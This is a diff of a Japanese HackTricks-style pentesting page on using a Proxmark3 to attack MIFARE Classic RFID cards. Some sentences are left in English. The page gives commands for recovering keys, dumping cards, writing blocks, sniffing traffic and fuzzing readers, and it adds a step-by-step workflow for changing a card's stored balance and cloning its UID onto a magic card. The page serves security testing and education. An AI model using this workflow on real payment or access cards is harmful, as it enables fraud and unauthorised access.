@@ -2,15 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Proxmark3を使用したRFIDシステムの攻撃
+## Proxmark3 を使った RFID システムの攻撃
 
-最初に必要なのは[**Proxmark3**](https://proxmark.com)を持っていて、[**ソフトウェアとその依存関係をインストールすること**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)です。
+The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
 
-### MIFARE Classic 1KBの攻撃
+### MIFARE Classic 1KB への攻撃
 
-**16セクター**があり、それぞれに**4ブロック**があり、各ブロックには**16B**が含まれています。UIDはセクター0のブロック0にあり（変更できません）。\
-各セクターにアクセスするには、**2つのキー**（**A**と**B**）が必要で、これらは**各セクターのブロック3**（セクタートレーラー）に保存されています。セクタートレーラーは、**各ブロック**に対する**読み取りおよび書き込み**権限を与える**アクセスビット**も保存しています。\
-2つのキーは、最初のキーを知っていれば読み取り権限を与え、2番目のキーを知っていれば書き込み権限を与えるのに役立ちます（例えば）。
+それは **16セクタ** を持ち、各セクタは **4ブロック**、各ブロックは **16B** を含みます。UIDはセクタ0ブロック0にあり（変更できません）。\
+各セクタにアクセスするには、各セクタの **ブロック3**（sector trailer）に格納されている **2つのキー**（**A** と **B**）が必要です。セクタトレーラは、2つのキーを使って **各ブロック** に対する **読み取り** と **書き込み** 権限を与える **アクセスビット** も格納しています。\
+2つのキーは、たとえば最初のキーが分かれば読み取り、二番目のキーが分かれば書き込みを許可するといった用途に便利です。
 
 いくつかの攻撃が実行できます。
 ```bash
@@ -31,11 +31,39 @@ proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to
 proxmark3> hf mf eget 01 # Read block 1
 proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
 ```
-Proxmark3は、**タグとリーダー間の通信を盗聴**して機密データを探すなど、他のアクションを実行することができます。このカードでは、通信をスニッフィングし、使用されているキーを計算することができます。なぜなら、**使用される暗号操作が弱いため**、平文と暗号文を知っていれば計算できるからです（`mfkey64`ツール）。
+The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **cryptographic operations used are weak** and knowing the plain and cipher text you can calculate it (`mfkey64` tool).
 
-### 生のコマンド
+#### MiFare Classic quick workflow for stored-value abuse
 
-IoTシステムは時々、**ブランドのないまたは商業用でないタグ**を使用します。この場合、Proxmark3を使用してタグにカスタム**生のコマンドを送信**することができます。
+When terminals store balances on Classic cards, a typical end-to-end flow is:
+```bash
+# 1) Recover sector keys and dump full card
+proxmark3> hf mf autopwn
+
+# 2) Modify dump offline (adjust balance + integrity bytes)
+#    Use diffing of before/after top-up dumps to locate fields
+
+# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
+proxmark3> hf mf cload -f modified.bin
+
+# 4) Clone original UID so readers recognize the card
+proxmark3> hf mf csetuid -u <original_uid>
+```
+注意
+
+- `hf mf autopwn` は nested/darkside/HardNested-style 攻撃をオーケストレーションし、鍵を回復し、クライアントの dumps フォルダにダンプを作成します。
+- ブロック0/UID の書き込みは magic gen1a/gen2 カードでのみ動作します。通常の Classic カードでは UID は読み取り専用です。
+- 多くの導入では Classic の「value blocks」や単純なチェックサムが使われています。編集後は、複製・補完されたフィールドやチェックサムが一貫していることを確認してください。
+
+より上位の手法や緩和策については、次を参照してください：
+
+{{#ref}}
+pentesting-rfid.md
+{{#endref}}
+
+### Raw コマンド
+
+IoTシステムでは、**非ブランドまたは非商用のタグ**を使用することがあります。その場合、Proxmark3 を使ってタグにカスタムの **生のコマンド** を送信できます。
 ```bash
 proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
 SAK : 08 [2]
@@ -45,14 +73,21 @@ No chinese magic backdoor command detected
 Prng detection: WEAK
 Valid ISO14443A Tag Found - Quiting Search
 ```
-この情報を使って、カードに関する情報やそれとの通信方法を検索することができます。Proxmark3は、次のような生のコマンドを送信することを可能にします: `hf 14a raw -p -b 7 26`
+この情報を使って、カードやカードと通信する方法について調べてみてください。Proxmark3 は次のような raw コマンドを送信できます: `hf 14a raw -p -b 7 26`
 
 ### スクリプト
 
-Proxmark3ソフトウェアには、簡単なタスクを実行するために使用できる**自動化スクリプト**のプリロードされたリストが付属しています。完全なリストを取得するには、`script list`コマンドを使用します。次に、`script run`コマンドを使用し、スクリプトの名前を続けて入力します:
+Proxmark3 ソフトウェアには、簡単なタスクを実行するために使える **自動化スクリプト** がプリロードされています。完全な一覧を取得するには `script list` コマンドを使用してください。次に `script run` コマンドを使用し、続けてスクリプト名を指定します:
 ```
 proxmark3> script run mfkeys
 ```
-**タグリーダーをファズする**スクリプトを作成できます。したがって、**有効なカード**のデータをコピーするには、1つ以上のランダムな**バイト**を**ランダム化**し、任意の反復で**リーダーがクラッシュする**かどうかを確認する**Luaスクリプト**を書くだけです。
+スクリプトを作成して **fuzz tag readers** を行うことができます。つまり、**valid card** のデータをコピーし、**Lua script** を書いて、1つ以上のランダムな **bytes** を **randomize** し、任意の反復で **reader crashes** するかを確認します。
+
+## 参考
+
+- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
+- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
+- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
+- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
 
 {{#include ../../banners/hacktricks-training.md}}
